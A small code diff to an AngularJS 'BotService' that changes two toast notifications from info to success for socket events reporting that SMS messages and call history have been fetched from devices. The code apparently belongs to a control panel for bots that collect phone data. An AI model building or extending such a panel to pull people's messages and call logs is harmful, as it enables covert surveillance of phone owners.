@@ -91,14 +91,14 @@ App.service('BotService', ['$http', function($http) {
       toastr.info('Get SMS started.', device.device)
     })
     socket.on('getmessages:done', function(device) {
-      toastr.info('Done getting SMS.', device.device)
+      toastr.success('Done getting SMS.', device.device)
     })
 
     socket.on('getcallhistory:started', function(device) {
       toastr.info('Get call history started.', device.device)
     })
     socket.on('getcallhistory:done', function(device) {
-      toastr.info('Done getting call history.', device.device)
+      toastr.success('Done getting call history.', device.device)
     })
 
     socket.on('nopermission', function(data) {
